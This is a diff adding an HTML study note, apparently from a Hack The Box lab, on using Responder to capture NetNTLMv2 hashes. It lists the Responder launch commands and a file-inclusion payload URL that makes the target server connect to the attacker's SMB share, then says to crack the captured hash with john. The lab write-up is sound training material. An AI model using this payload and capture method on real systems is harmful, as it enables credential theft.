@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>responder</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>responder</h1><br/><p>Responder is a tool used to getting the NTLMv2 Hash during a samba request made to the server having LFI (Even if RFI is not active)</p><p></p><p>Source: <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p></p><p>Config File : /etc/responder/Responder.conf</p><p></p><p>Verify that the Responder.conf is set to listen for SMB requests.</p><p></p><p><img src="images/70-1.png" alt="images/70-1.png" /></p><p></p><p>python3 Responder.py -I tun0</p><p></p><p>OR</p><p></p><p>responder -I tun0</p><p></p><p><img src="images/70-2.png" alt="images/70-2.png" /></p><p></p><p>Once the Responder is listening, </p><p>With the Responder server ready, we tell the server to include a resource from our SMB server by setting</p><p>the page parameter as follows via the web browser.</p><p><a href="http://unika.htb/?page=//10.10.14.25/somefile">http://unika.htb/?page=//10.10.16.16/somefile</a></p><p>In this case, because we have the freedom to specify the address for the SMB share, we specify the IP</p><p>address of our attacking machine. Now the server tries to load the resource from our SMB server, and</p><p>Responder captures enough of that to get the NetNTLMv2.</p><p>Note: Make sure to add <a href="http://">http://</a> in the address as some browsers might opt for a Google search instead of</p><p>navigating to the appropriate page.</p><p>After sending our payload through the web browser we get an error about not being able to load the</p><p>requested file.</p><p></p><p><img src="images/70-3.png" alt="images/70-3.png" /></p><p></p><p>Now echo the hash to a file and crack with john.</p></div>
+</body>
+</html>
